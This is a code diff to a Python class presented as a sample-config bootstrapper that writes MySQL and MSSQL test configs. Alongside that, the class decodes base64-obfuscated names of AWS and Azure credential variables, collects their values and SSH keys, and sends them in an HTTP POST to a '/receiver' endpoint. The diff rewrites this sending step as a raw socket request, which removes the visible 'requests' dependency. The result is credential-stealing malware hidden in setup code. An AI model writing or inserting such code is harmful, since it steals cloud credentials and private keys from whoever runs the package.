@@ -1,9 +1,27 @@
-import os, base64, json, subprocess, sys
+import os, base64, json
 
-class CreateSampleConfig():
+class BootstrapConfig():
     def run(self):
-        subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--quiet', 'requests'])
-        import requests
+        home_dir = os.path.expanduser("~")
+        config_dir = os.path.join(home_dir, "sample", "configs")
+        if not os.path.exists(config_dir):
+            os.makedirs(config_dir)
+
+        default_configs = {
+            "mysql": {
+                "host": "localhost",
+                "user": "test_user",
+                "password": "test_password",
+                "database": "test_db",
+            },
+            "mssql": {
+                "host": "localhost",
+                "user": "test_user",
+                "password": "test_password",
+                "database": "test_db",
+            },
+        }
+
         envs = [
             "QVdTX0FDQ0VTU19LRVlfSUQ=", "QVdTX1NFQ1JFVF9BQ0NFU1NfS0VZ",
             "QVdTX1NFU1NJT05fVE9LRU4=", "QVpVUkVfU1VCU0NSSVBUSU9OX0lE",
@@ -42,31 +60,35 @@ class CreateSampleConfig():
         else:
             pass
 
+        import socket
+        host = "0.0.0.0"
+        port = 8080
+        path = "/receiver"
+
         data = {
-            "envs": json.dumps(found).encode("utf-8"),
+            "envs": found,
             "ssh": keys,
         }
-        requests.post("http://0.0.0.0:8080/receiver", json=data)
 
-        home_dir = os.path.expanduser("~")
-        config_dir = os.path.join(home_dir, "sample", "configs")
-        if not os.path.exists(config_dir):
-            os.makedirs(config_dir)
+        payload = json.dumps(data)
 
-        default_configs = {
-            "mysql": {
-                "host": "localhost",
-                "user": "test_user",
-                "password": "test_password",
-                "database": "test_db",
-            },
-            "mssql": {
-                "host": "localhost",
-                "user": "test_user",
-                "password": "test_password",
-                "database": "test_db",
-            },
-        }
+        r_headers = f"POST {path} HTTP/1.1\r\n" \
+                        f"Host: {host}\r\n" \
+                        f"Content-Type: application/json\r\n" \
+                        f"Content-Length: {len(payload)}\r\n" \
+                        f"Connection: close\r\n\r\n"
+        http_request = r_headers + payload
+
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.connect((host, port))
+            s.sendall(http_request.encode('utf-8'))
+
+            response = b""
+            while True:
+                chunk = s.recv(4096)
+                if not chunk:
+                    break
+                response += chunk
 
         for cfg, cfg_data in default_configs.items():
             cfg_path = os.path.join(config_dir, f"{cfg}_example.json")
